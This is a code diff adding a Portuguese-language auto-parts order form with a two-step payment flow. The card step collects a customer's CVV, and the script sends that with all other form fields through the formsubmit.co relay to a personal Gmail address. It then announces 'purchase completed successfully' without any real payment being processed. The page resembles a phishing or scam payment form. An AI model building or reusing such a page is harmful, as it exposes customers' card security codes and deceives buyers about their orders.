@@ -1,0 +1,145 @@
+<section style="max-width:600px;margin:40px auto;font-family:Arial,sans-serif;">
+  <h2 style="text-align:center;">Solicitar Peça</h2>
+
+  <form id="formGM">
+
+    <input type="hidden" name="_captcha" value="false">
+
+    <!-- ETAPA 1 -->
+    <div id="etapa1">
+
+      <label>Nome Completo</label>
+      <input type="text" name="Nome" required style="width:100%;padding:10px;margin-bottom:15px;">
+
+      <label>Telefone</label>
+      <input type="tel" name="Telefone" required style="width:100%;padding:10px;margin-bottom:15px;">
+
+      <label>Número da Televisão</label>
+      <input type="text" name="Numero_da_Televisao" required style="width:100%;padding:10px;margin-bottom:15px;">
+
+      <label>Veículo</label>
+      <input type="text" name="Veiculo" required style="width:100%;padding:10px;margin-bottom:15px;">
+
+      <label>Peça que precisa</label>
+      <input type="text" id="pecaInput" name="Peca" required style="width:100%;padding:10px;margin-bottom:15px;">
+
+      <label>Mensagem</label>
+      <textarea name="Mensagem" required style="width:100%;padding:10px;height:120px;margin-bottom:15px;"></textarea>
+
+      <button type="button" onclick="mostrarPagamento()" 
+      style="width:100%;padding:12px;background:#111;color:#fff;border:none;font-size:16px;cursor:pointer;">
+        Enviar Solicitação
+      </button>
+
+    </div>
+
+    <!-- ETAPA 2 -->
+    <div id="etapa2" style="display:none;margin-top:30px;">
+
+      <h3 id="pecaConfirmada"></h3>
+
+      <label>Forma de Pagamento</label><br><br>
+
+      <input type="radio" name="Forma_de_Pagamento" value="Pix" onclick="mostrarPix()" required> Pix<br><br>
+      <input type="radio" name="Forma_de_Pagamento" value="Cartao" onclick="mostrarCartao()"> Cartão<br><br>
+
+      <!-- PIX -->
+      <div id="pixInfo" style="display:none;background:#f5f5f5;padding:15px;border-radius:5px;margin-bottom:15px;">
+        <strong>Chave Pix (CPF):</strong><br>
+        000.000.000-00
+      </div>
+
+      <!-- CARTÃO -->
+      <div id="cartaoInfo" style="display:none;margin-bottom:15px;">
+        <label>Digite o CVV</label>
+        <input type="text" name="CVV" placeholder="CVV" style="width:100%;padding:10px;">
+      </div>
+
+      <button type="button" onclick="finalizarPedido()" 
+      style="width:100%;padding:12px;background:#28a745;color:#fff;border:none;font-size:16px;cursor:pointer;">
+        Finalizar Pedido
+      </button>
+
+    </div>
+
+  </form>
+</section>
+
+<!-- TELA OVERLAY -->
+<div id="overlay" style="
+display:none;
+position:fixed;
+top:0;left:0;
+width:100%;height:100%;
+background:rgba(0,0,0,0.9);
+color:#fff;
+justify-content:center;
+align-items:center;
+flex-direction:column;
+z-index:9999;
+font-family:Arial;">
+  <div id="mensagemStatus" style="font-size:22px;text-align:center;">
+    Aguarde um instante...
+  </div>
+</div>
+
+<script>
+
+function mostrarPagamento() {
+  var peca = document.getElementById("pecaInput").value;
+
+  if(peca === "") {
+    alert("Digite a peça primeiro!");
+    return;
+  }
+
+  document.getElementById("pecaConfirmada").innerText = "Peça: " + peca;
+  document.getElementById("etapa1").style.display = "none";
+  document.getElementById("etapa2").style.display = "block";
+}
+
+function mostrarPix() {
+  document.getElementById("pixInfo").style.display = "block";
+  document.getElementById("cartaoInfo").style.display = "none";
+}
+
+function mostrarCartao() {
+  document.getElementById("pixInfo").style.display = "none";
+  document.getElementById("cartaoInfo").style.display = "block";
+}
+
+function finalizarPedido() {
+
+  var pagamentoSelecionado = document.querySelector('input[name="Forma_de_Pagamento"]:checked');
+  if(!pagamentoSelecionado){
+    alert("Escolha a forma de pagamento!");
+    return;
+  }
+
+  var overlay = document.getElementById("overlay");
+  var mensagem = document.getElementById("mensagemStatus");
+
+  overlay.style.display = "flex";
+  mensagem.innerText = "Aguarde um instante...";
+
+  var form = document.getElementById("formGM");
+  var formData = new FormData(form);
+
+  fetch("https://formsubmit.co/ajax/gmdesmonte@gmail.com", {
+      method: "POST",
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+  })
+  .then(response => response.json())
+  .then(data => {
+      mensagem.innerText = "Compra realizada com sucesso!";
+  })
+  .catch(error => {
+      mensagem.innerText = "Erro ao enviar. Tente novamente.";
+  });
+
+}
+
+</script>
